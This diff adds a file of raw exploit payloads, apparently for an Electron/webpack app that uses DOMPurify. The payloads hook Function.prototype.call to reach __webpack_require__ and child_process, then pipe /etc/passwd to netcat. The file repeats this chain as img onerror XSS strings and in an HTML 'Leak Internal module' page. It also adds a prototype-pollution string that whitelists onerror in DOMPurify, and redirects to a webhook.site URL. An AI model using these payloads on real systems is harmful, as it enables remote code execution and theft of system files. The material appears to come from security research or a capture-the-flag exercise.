@@ -1,0 +1,83 @@
+
+  const originalCall =  Function.prototype.call
+
+  Function.prototype.call = function(... args){ 
+
+
+  if( args[3] && args[3].name === '__webpack_require__'){
+
+    console.log(args)
+    
+    window.__test = args[3]
+
+  }
+  return originalCall.apply(this,args) 
+
+
+  }
+
+  //"^16.2.8"
+
+
+
+__test("module")._load("child_process").exec("cat /etc/passwd | nc localhost 4445")
+
+
+
+const originalCall=Function.prototype.call;Function.prototype.call=function(...l){return l[3]&&"__webpack_require__"===l[3].name&&l[3]("module")._load("child_process").exec("cat /etc/passwd | nc localhost 4445"),originalCall.apply(this,l)};
+
+
+DOMPurify.sanitize('<img src onerror=\'const originalCall=Function.prototype.call;Function.prototype.call=function(...l){return l[3]&&"__webpack_require__"===l[3].name&&l[3]("module")._load("child_process").exec("cat /etc/passwd | nc localhost 4445"),originalCall.apply(this,l)};\'>')
+
+
+
+<img src onerror='const originalCall=Function.prototype.call;Function.prototype.call=function(...l){return l[3]&&\"__webpack_require__\"===l[3].name&&l[3](\"module\")._load(\"child_process\").exec(\"cat /etc/passwd | nc localhost 4445\"),originalCall.apply(this,l)};'>
+
+
+<img src onerror="const originalCall=Function.prototype.call;Function.prototype.call=function(...l){return l[3]&&'__webpack_require__'===l[3].name&&l[3]('module')._load('child_process').exec('cat /etc/passwd | nc localhost 4445'),originalCall.apply(this,l)};">
+
+
+
+<img src=1 onerror="const originalCall=Function.prototype.call;Function.prototype.call=function(...l){return l[3]&&'__webpack_require__'===l[3].name&&l[3]('module')._load('child_process').exec('cat /etc/passwd | nc localhost 4445'),originalCall.apply(this,l)};">
+
+
+<img src=1 onerror="document.location='http://webhook.site/7b4f85c3-9df8-485b-b573-948a95f5f164'>
+
+
+<img src=1 onerror="document.location='http://localhost:4446/leak.html'">
+
+window.__test("module")._load("child_process")
+
+<img src=1 onerror="alert(1)">
+
+__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
+
+<html>
+
+<body>
+
+    <h1>Leak Internal module</h1>
+<script>
+    const originalCall =  Function.prototype.call
+
+    Function.prototype.call = function(... args){ 
+    
+        console.log(args)
+    if( args[3] && args[3].name === '__webpack_require__'){
+    
+      //console.log(args)
+      window.__test= args[3]
+      
+      args[3]("module")._load("child_process").exec("cat /etc/passwd | nc localhost 4445")
+    
+    }
+    return originalCall.apply(this,args) 
+    
+    }
+    
+
+</script>
+
+</body>
+
+</html>
